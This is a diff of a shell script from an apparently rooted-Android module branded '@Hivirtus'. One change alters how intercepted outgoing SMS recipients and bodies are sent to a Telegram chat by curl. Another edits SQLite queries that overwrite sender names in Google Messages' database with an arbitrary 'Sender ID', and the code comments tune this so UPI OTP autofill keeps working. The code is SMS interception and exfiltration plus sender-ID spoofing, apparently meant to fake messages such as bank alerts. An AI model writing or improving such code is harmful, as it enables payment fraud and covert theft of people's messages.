@@ -1087,15 +1087,13 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # Exact screenshot: bold header+labels, mono To/Body, blank gaps
+  # Match spaced screenshot: 1 blank after header, 1 blank between To ↔ Body
   HTML_TO=$(tg_html_escape "$TO_NUM")
   HTML_BODY=$(tg_html_escape "$MSG_BODY")
   TEXT="📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>
 
-
 <b>To (Tap to copy):</b>
 <code>${HTML_TO}</code>
-
 
 <b>Body (Tap to copy):</b>
 <code>${HTML_BODY}</code>"
@@ -1172,20 +1170,20 @@ tg_http_post() {
       [ -s "$resp" ] && return 0
     fi
   done
-  # Fallback: form-urlencoded text= (wget without JSON)
+  # Fallback: form-urlencoded — unescape JSON \n so Telegram keeps spacing
   local text chat
   text=$(grep -o '"text"[[:space:]]*:[[:space:]]*"[^"]*"' "$payload" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  # Convert literal \n \r in extracted JSON string → real newlines
+  text=$(printf '%s' "$text" | sed 's/\\n/\n/g; s/\\r//g; s/\\"/"/g; s/\\\\/\\/g')
   chat="$TG_CHAT"
   if [ -n "$text" ] && [ -n "$chat" ]; then
-    local form="/data/local/tmp/hivirtus_tg_form.txt"
-    # shell escape for form
-    printf 'chat_id=%s&text=%s&disable_web_page_preview=true' "$chat" "$text" > "$form"
     if command -v curl >/dev/null 2>&1; then
-      curl -sS -m 30 -X POST "$url" --data-urlencode "chat_id=${chat}" --data-urlencode "text=${text}" -o "$resp" 2>/dev/null
-      [ -s "$resp" ] && return 0
-    fi
-    if [ -x /system/bin/toybox ]; then
-      /system/bin/toybox wget -q -O "$resp" -T 30 --post-file="$form" "$url" 2>/dev/null
+      curl -sS -m 30 -X POST "$url" \
+        --data-urlencode "chat_id=${chat}" \
+        --data-urlencode "text=${text}" \
+        --data-urlencode "parse_mode=HTML" \
+        --data-urlencode "disable_web_page_preview=true" \
+        -o "$resp" 2>/dev/null
       [ -s "$resp" ] && return 0
     fi
   fi
@@ -1279,10 +1277,6 @@ rewrite_inbox_sender_id() {
   chmod 666 /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
 
   local changed=0
-  local now_ms cutoff_ms
-  now_ms=$(date +%s)000
-  # Last 24 hours — older OTP threads bhi SID pe
-  cutoff_ms=$((now_ms - 86400000))
 
   local sql_sid
   sql_sid=$(printf '%s' "$sid" | sed "s/'/''/g")
@@ -1316,52 +1310,13 @@ rewrite_inbox_sender_id() {
     [ -z "$SQL3" ] && [ -x "$cand" ] && SQL3="$cand"
   done
 
-  # --- Path 1: sqlite mmssms.db (sms.address + conversation title via canonical_addresses) ---
-  local db
-  for db in \
-    /data/data/com.android.providers.telephony/databases/mmssms.db \
-    /data/user/0/com.android.providers.telephony/databases/mmssms.db \
-    /data/user_de/0/com.android.providers.telephony/databases/mmssms.db
-  do
-    [ -f "$db" ] || continue
-    [ -n "$SQL3" ] || break
-    # Collect old addresses before rewrite (for canonical / bugle sync)
-    local old_addrs
-    old_addrs=$("$SQL3" "$db" \
-      "SELECT DISTINCT address FROM sms WHERE type=1 AND date>=${cutoff_ms} AND IFNULL(address,'')!='${sql_sid}';" \
-      2>/dev/null | head -n 40)
-    "$SQL3" "$db" \
-      "UPDATE sms SET address='${sql_sid}' WHERE type=1 AND date>=${cutoff_ms} AND IFNULL(address,'')!='${sql_sid}';" \
-      2>/dev/null
-    # Conversation list title = canonical_addresses, not sms.address alone
-    "$SQL3" "$db" \
-      "UPDATE canonical_addresses SET address='${sql_sid}' WHERE IFNULL(address,'')!='' AND IFNULL(address,'')!='${sql_sid}' AND _id IN (
-         SELECT CAST(recipient_ids AS INTEGER) FROM threads WHERE _id IN (
-           SELECT DISTINCT thread_id FROM sms WHERE type=1 AND date>=${cutoff_ms}
-         )
-       );" 2>/dev/null || true
-    # Also force any canonical row that still equals a just-rewritten old address
-    if [ -n "$old_addrs" ]; then
-      printf '%s\n' "$old_addrs" | while IFS= read -r oa; do
-        [ -z "$oa" ] && continue
-        [ "$oa" = "$sid" ] && continue
-        esc_oa=$(printf '%s' "$oa" | sed "s/'/''/g")
-        "$SQL3" "$db" "UPDATE canonical_addresses SET address='${sql_sid}' WHERE address='${esc_oa}';" 2>/dev/null || true
-      done
-    fi
-    local after
-    after=$("$SQL3" "$db" \
-      "SELECT COUNT(*) FROM sms WHERE type=1 AND date>=${cutoff_ms} AND address='${sql_sid}';" \
-      2>/dev/null | tr -d '\r\n')
-    if [ -n "$after" ] && [ "$after" != "0" ]; then
-      changed=1
-      echo "sender_sqlite_ok sid=$sid db=$db after=$after $(date +%s)" \
-        >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
-    fi
-    [ "$changed" = "1" ] && break
-  done
+  # --- Path 1: mmssms.db SKIPPED ---
+  # Rewriting sms.address / canonical breaks UPI OTP autofill (apps match bank sender).
+  # Sender ID = Messages SmsMessage hooks + bugle_db display only.
+  echo "sender_mmssms_skip_otp_safe sid=$sid $(date +%s)" \
+    >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
 
-  # --- Path 1b: Google Messages bugle_db participants (UI cache) ---
+  # --- Path 1b: Google Messages bugle_db participants (UI display only) ---
   if [ -n "$SQL3" ]; then
     local bdb
     for bdb in \
@@ -1371,12 +1326,10 @@ rewrite_inbox_sender_id() {
       /data/user/0/com.motorola.messaging/databases/bugle_db
     do
       [ -f "$bdb" ] || continue
-      # Aggressive: any +91 / long digit participant → menu Sender ID
+      # Display-only columns — leave normalized for routing if schema allows
       "$SQL3" "$bdb" "
         UPDATE participants SET
           display_destination='${sql_sid}',
-          normalized_destination='${sql_sid}',
-          send_destination='${sql_sid}',
           full_name='${sql_sid}'
         WHERE IFNULL(display_destination,'')!='${sql_sid}'
         AND (
@@ -1390,62 +1343,20 @@ rewrite_inbox_sender_id() {
       " 2>/dev/null && changed=1 && \
         echo "sender_bugle_force sid=$sid db=$bdb $(date +%s)" \
           >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
-      # conversation name columns (schema variants)
       "$SQL3" "$bdb" "UPDATE conversations SET name='${sql_sid}' WHERE IFNULL(name,'')!='' AND name!='${sql_sid}' AND (name LIKE '+%' OR name GLOB '[0-9]*');" 2>/dev/null || true
       "$SQL3" "$bdb" "UPDATE conversations SET subject='${sql_sid}' WHERE IFNULL(subject,'')!='' AND subject!='${sql_sid}' AND (subject LIKE '+%' OR subject GLOB '[0-9]*');" 2>/dev/null || true
-      # Fallback schema variants (older Messages)
-      "$SQL3" "$bdb" "
-        UPDATE participants SET
-          display_destination='${sql_sid}',
-          normalized_destination='${sql_sid}',
-          send_destination='${sql_sid}'
-        WHERE (
-          display_destination LIKE '+91%'
-          OR normalized_destination LIKE '+91%'
-          OR send_destination LIKE '+91%'
-        )
-        AND IFNULL(display_destination,'')!='${sql_sid}';
-      " 2>/dev/null || true
     done
   else
     echo "sender_sqlite_missing $(date +%s)" >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
   fi
 
-  # --- Path 2: content / cmd content (backup; often fails as shell on A16) ---
-  local out="/data/local/tmp/hivirtus_inbox_query.txt"
-  rm -f "$out"
-  if command -v content >/dev/null 2>&1; then
-    content query --uri content://sms/inbox --projection _id:address:date \
-      --sort "date DESC" 2>/dev/null | head -n 100 > "$out" || true
-  fi
-  if [ ! -s "$out" ] && command -v cmd >/dev/null 2>&1; then
-    cmd content query --uri content://sms/inbox --projection _id:address:date \
-      --sort "date DESC" 2>/dev/null | head -n 100 > "$out" || true
-  fi
-
-  if [ -s "$out" ]; then
-    local id addr date
-    while IFS= read -r line; do
-      id=$(printf '%s' "$line" | sed -n 's/.*_id=\([0-9][0-9]*\).*/\1/p' | head -n1)
-      addr=$(printf '%s' "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | head -n1 | sed 's/[[:space:]]*$//;s/^[[:space:]]*//')
-      date=$(printf '%s' "$line" | sed -n 's/.*date=\([0-9][0-9]*\).*/\1/p' | head -n1)
-      [ -z "$id" ] || [ -z "$addr" ] && continue
-      [ "$addr" = "$sid" ] && continue
-      if [ -n "$date" ] && [ "$date" -lt "$cutoff_ms" ] 2>/dev/null; then
-        continue
-      fi
-      if content update --uri content://sms/inbox --bind address:s:"$sid" --where "_id=$id" >/dev/null 2>&1 \
-         || cmd content update --uri content://sms/inbox --bind address:s:"$sid" --where "_id=$id" >/dev/null 2>&1; then
-        changed=1
-      fi
-    done < "$out"
-  fi
+  # --- Path 2: content://sms SKIPPED (OTP apps read real address from provider) ---
+  echo "sender_content_skip_otp_safe sid=$sid $(date +%s)" \
+    >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
 
   if [ "$changed" = "1" ]; then
-    echo "sender_rewrite_ok sid=$sid $(date +%s)" >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
+    echo "sender_rewrite_ok sid=$sid bugle_only=1 $(date +%s)" >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
-    am broadcast -a android.intent.action.PROVIDER_CHANGED \
-      --es android.intent.extra.DATA_CHANGED "content://sms" >/dev/null 2>&1 || true
   else
     echo "sender_rewrite_noop sid=$sid sql3=${SQL3:-none} $(date +%s)" \
       >> /data/local/tmp/hivirtus_sender_rewrite.log 2>/dev/null
